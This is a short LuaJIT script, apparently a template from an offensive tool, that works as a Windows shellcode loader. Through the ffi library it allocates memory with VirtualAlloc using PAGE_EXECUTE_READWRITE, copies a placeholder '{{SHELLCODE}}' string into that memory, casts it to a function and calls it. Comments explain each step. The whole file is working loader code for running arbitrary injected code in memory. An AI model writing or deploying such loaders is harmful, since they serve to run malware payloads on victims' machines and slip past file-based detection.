local ffi = require('ffi')

-- the shellcode
local code = '{{SHELLCODE}}'

ffi.cdef[[
typedef void (*Handle)(void);
void *VirtualAlloc(void *, size_t, unsigned long,
unsigned long);
]]
-- allocate memory with executable rights
-- 0x3000 = MEM_COMMIT + MEM_RESERVE
-- 0x40 = PAGE_EXECUTE_READWRITE
local mem = ffi.C.VirtualAlloc(nil, #code, 0x3000, 0x40)
ffi.copy(mem, ffi.new("char[?]", #code, code), #code)
func = ffi.cast("Handle", mem)
func() -- run the shellcode
